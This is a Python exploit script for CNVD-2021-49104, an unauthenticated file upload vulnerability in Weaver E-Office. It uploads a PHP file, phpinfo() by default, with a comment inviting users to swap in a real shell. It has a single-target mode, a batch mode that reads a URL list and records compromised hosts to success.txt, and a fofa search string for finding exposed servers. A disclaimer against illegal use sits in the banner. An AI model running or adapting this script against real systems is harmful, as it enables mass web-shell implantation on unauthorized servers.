import requests
import sys
'''
项目地址：https://github.com/chaosec2021
漏洞编号：CNVD-2021-49104
by 欢迎关注chaosec公众号
fofa:app="泛微-EOffice" 
'''

def upload(url):
    uri = '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    url_all = url + uri
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36',
    }
    shell = '''<?php phpinfo();?>
    '''                     #shell可自行更改
    file={'Filedata':('shell.php',shell)}
    try:
        resp=requests.post(url=url_all,headers=header,files=file)
        resp_text=resp.text
        resp_code=resp.status_code
        shell_url=url+'/images/logo/'+resp_text
        if resp_code ==200 and 'logo-eoffice.php' == resp_text:
            print(f'[+]上传成功:{shell_url}')
        else:
            print('[-]上传失败')
    except:
        print('[-]请求错误')

def upload_pl(files):
    uri = '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    f = open(files)
    f1 = f.readlines()
    for url in f1:
        url =url.replace('\n','')
        # print(url)

        url_all = url + uri
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36',
        }
        shell = '''<?php phpinfo();?>
            '''  # shell可自行更改
        file = {'Filedata': ('shell.php', shell)}
        try:
            resp = requests.post(url=url_all, headers=header, files=file,timeout=5)
            resp_text = resp.text
            resp_code = resp.status_code
            shell_url = url + '/images/logo/' + resp_text
            if resp_code == 200 and 'logo-eoffice.php' == resp_text:
                print(f'[+]上传成功:{shell_url}')
                f_success = open('success.txt','a+')
                f_success.write(shell_url + '\n')
                f_success.close()
                continue
            else:
                print('[-]上传失败')
        except:
            print('[-]请求错误')

def help():
    print(' ')
    print('**** python 泛微_E-Office_upload -h  查看帮助 ')
    print('**** python 泛微_E-Office_upload -upload http://127.0.0.1:8080  验证单个url文件上传 ')
    print('**** python 泛微_E-Office_upload --upload-pl url.txt  批量验证多个url文件上传 ')

if __name__=="__main__":
    try:
        print('')
        print("by 欢迎关注chaosec公众号，禁止用于一切违法操作")
        print('')
        cmd1 = sys.argv[1]

        if cmd1 == '-h':
            help()
        elif cmd1 == '-upload':
            cmd2 = sys.argv[2]
            upload(cmd2)
        elif cmd1 == '--upload-pl':
            cmd2 = sys.argv[2]
            upload_pl(cmd2)
        else:
            print('[-]请输入正确的参数，或者-h查看帮助')
    except:
        print('[-]输入-h查看帮助')




